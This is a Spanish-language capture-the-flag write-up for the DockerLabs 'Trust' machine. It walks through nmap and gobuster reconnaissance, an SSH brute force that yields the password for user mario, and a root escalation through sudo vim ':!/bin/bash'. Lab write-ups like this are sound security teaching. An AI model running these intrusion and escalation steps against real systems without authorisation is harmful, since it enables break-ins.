# Máquina Trust

Dificultad -> Muy fácil

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

----------------
## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada a los puertos descubiertos en el anterior escaneo.

```shell
nmap -sCV -p22,80 172.17.0.2 -oN targeted
________________________________________________
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 19a11a42fa3a9d9a0fea917f7edba3c7 (ECDSA)
|_  256 a6fdcf45a695052c5810738d39572bff (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Le echamos un vistazo a la web:

![Pasted image 20240422153530](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/279340af-0955-41f7-8d84-5ec94fdde2c3)

Se trata de la página por defecto de Apache. Haremos un poco de **fuzzing** con gobuster.

```shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x html,php,txt,php.bak
---------------------------------------------------------------------------------
/index.html           (Status: 200) [Size: 10701]
/secret.php           (Status: 200) [Size: 927]  
/server-status        (Status: 403) [Size: 275
```

Encontramos un **secret.php**. Le echamos un vistazo:

![Pasted image 20240422153718](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/575be71d-b4a7-4747-bf85-0733e6befba4)

--------------
## Explotación

Tan solo obtenemos esto. El único vector de ataque que se me ocurre es hacer fuerza bruta al otro puerto abierto, el **22** que es el **ssh** con el usuario **mario**.

![Pasted image 20240422153934](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/396882d4-6159-4050-bcf1-29fc96ba6209)

Encontramos credenciales para acceder por ssh -> **mario:chocolate**

```shell
ssh mario@172.17.0.2
```

Estamos dentro !

------------------------------
### Tratamiento de la tty

Realizaremos un breve **tratamiento de la tty** para poder operar de forma cómoda sobre la consola. Los comandos a ejecutar:

```shell
script /dev/null -c bash 
```
(hacemos  **ctrl  +  Z**)

```shell
stty raw -echo; fg
reset xterm
stty rows 62 columns 248
export TERM=xterm
export SHELL=bash
```

Pondremos en rows y columns las columnas y filas que correspondan a la pantalla de nuestra máquina.
Una vez hecho esto podemos maniobrar con comodidad, pudiendo hacer Ctrl+L para limpiar la pantalla así como Ctrl+C.

------------
## Escalada de privilegios

Usamos **sudo -l** para ver si podemos ejecutar algo como root:

```shell
sudo -l
-----------------------
User mario may run the following commands on 78a58e094bf9:
    (ALL) /usr/bin/vim
```

Podemos ejecutar **vim**. Si no sabemos como explotarlo para escalar privilegios, siempre podemos consultar -> [GTFOBins](https://gtfobins.github.io/)

```shell
sudo vim -c ':!/bin/bash'
```

```shell
whoami
----------------
root
```
